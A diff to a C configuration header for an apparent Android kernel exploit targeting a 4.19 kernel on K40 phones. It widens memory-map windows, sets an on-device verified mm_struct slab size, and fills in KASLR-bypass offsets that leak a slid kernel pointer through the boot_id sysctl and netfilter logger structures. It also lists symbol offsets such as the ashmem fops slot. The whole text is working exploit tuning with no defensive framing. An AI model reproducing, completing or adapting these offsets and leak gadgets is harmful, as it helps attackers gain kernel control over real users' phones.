@@ -30,9 +30,9 @@
 #define P0_PHYS_OFFSET 0x80000000ULL                    /* [D] qcom standard; verify /proc/iomem */
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL               /* [B] PHYS + Image text_offset 0x80000 */
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL /* [D] 4GB window, tune to RAM size */
+#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] 16GB window (K40 6/8/12GB RAM) */
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END 0xffffff9000000000ULL            /* [D] idem */
+#define DIRECT_MAP_END 0xffffffc000000000ULL            /* [B] 16GB */
 #define VMEMMAP_START 0xffffffbc00000000ULL             /* [B] 4.19 39-bit layout (NOT 6.x 0xfffffffe..) */
 
 #define PSELECT_WAITER_WORD_SHIFT 1                     /* [D] stack-frame tuning, confirm at runtime */
@@ -45,7 +45,12 @@
 #define KMALLOC_CACHE_TYPES 3      /* 4.19 NR_KMALLOC_TYPES */
 #define ASHMEM_NAME_PREFIX_LEN 0   /* this kernel's ashmem has NO "/dev/ashmem" prefix (binary-verified) */
 #define ASHMEM_PREFIX_COUNT 0      /* 6.x prefix arithmetic disabled on 4.19 */
-#define MM_STRUCT_SZ 0x358         /* this kernel's sizeof(struct mm_struct); slab order TBD at runtime */
+/* on-device verified: mm_cachep object size == 0x340 (found via retry). */
+#define MM_STRUCT_SZ 0x340
+
+/* KASLR leak: direct /proc/kallsyms + dmesg are tried first (CFGOPS_4_19_STYLE
+ * disables the boot_id rb-gadget, which needs per-build values and would panic
+ * with the placeholder SLIDE_LOGGERS_0_1 / SLIDE_RANDOM_BOOT_ID_DATA). */
 
 /* ---------------- symbol offsets (off = sym - KIMAGE_TEXT_BASE) ---------------- */
 #define ASHMEM_MISC_FOPS_OFF 0x02ed2c60ULL              /* [A] ashmem_misc + 0x10 = miscdevice.fops slot */
@@ -99,8 +104,12 @@
 #define SLIDE_SYSCTL_BOOTID_OFF 0x032de2c4ULL           /* [A] sysctl_bootid */
 #define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
-#define SLIDE_LOGGERS_0_1_OFF 0x0ULL                    /* TODO: derive on 4.19 (round 2) */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0ULL            /* TODO: derive on 4.19 (round 2) */
+/* [B] loggers[0][0] (nf_log.c) == nfulnl_logger - 0xd8; content = &nfulnl_logger
+ *     (nfnetlink_log registers NFPROTO_UNSPEC). RELA-verified boot_id sysctl
+ *     entry .data slot = 0x2e33f68 (proc_do_uuid outputs table->data content
+ *     when data[8]!=0 -> leaks the slid pointer). */
+#define SLIDE_LOGGERS_0_1_OFF 0x02d92208ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02e33f68ULL
 #define SLIDE_WONLY_BOOTID 1                            /* [D] confirm */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
